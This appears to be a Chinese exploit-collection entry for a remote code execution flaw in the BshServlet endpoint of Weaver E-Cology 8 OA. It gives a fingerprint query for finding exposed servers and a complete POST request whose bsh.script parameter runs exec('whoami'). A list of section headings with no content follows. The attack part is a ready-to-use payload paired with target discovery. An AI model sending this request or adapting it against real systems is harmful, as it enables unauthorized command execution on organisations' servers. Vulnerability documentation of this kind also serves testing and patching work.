# 泛微E-Cology8BshServlet远程代码执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="泛微 e-cology OA"`
- **请求**：`POST /weaver/bsh.servlet.BshServlet HTTP/1.1`

**请求体 / payload**
```
/weaver/bsh.servlet.BshServlet
Content-Type: application/x-www-form-urlencoded
Host: 192.168.31.127:81
Content-Length: 49
bsh.script=exec("whoami");&bsh.servlet.output=raw
```

**其他**
- 泛微E-Cology 8 BshServlet 远程代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-cology 8